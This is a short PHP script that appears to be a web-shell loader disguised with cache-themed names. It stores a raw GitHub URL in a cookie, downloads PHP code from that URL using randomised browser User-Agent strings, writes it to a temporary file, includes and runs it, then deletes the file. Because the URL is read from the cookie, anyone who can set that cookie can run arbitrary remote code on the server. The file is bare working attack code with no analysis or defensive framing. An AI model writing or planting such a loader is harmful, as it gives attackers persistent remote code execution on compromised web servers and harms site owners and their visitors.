<?php
if (empty($_COOKIE['current_cache'])) {
    setcookie("current_cache", "https://raw.githubusercontent.com/sekaiowarida/geramx/refs/heads/main/gwuthib.php", time() + 3600, "/");
    header("Refresh:0");
    exit;
}

$url = filter_var($_COOKIE['current_cache'], FILTER_VALIDATE_URL);
if (!$url || parse_url($url, PHP_URL_SCHEME) !== 'https') {
    die("Invalid URL.");
}

$agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' . chr(32) . '(KHTML, like Gecko) Chrome/' . rand(80, 120) . '.0.' . rand(4000, 5000) . '.' . rand(100, 200) . ' Safari/537.36',
        'Mozilla/5.0%00 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/' . rand(80, 120) . '.0.' . rand(4000, 5000) . '.' . rand(100, 200) . ' Safari/537.36'
];

$opts = [
    "http" => [
        "header" => "User-Agent: " . $agents[array_rand($agents)]
    ]
];
$context = stream_context_create($opts);
$code = @file_get_contents($url, false, $context);

if (!$code || stripos($code, '<?php') === false) {
    die("Invalid content.");
}

$tmp = tempnam(sys_get_temp_dir(), 'cache_') . ".php";
file_put_contents($tmp, $code);
chmod($tmp, 0600);
include $tmp;
unlink($tmp);
?>
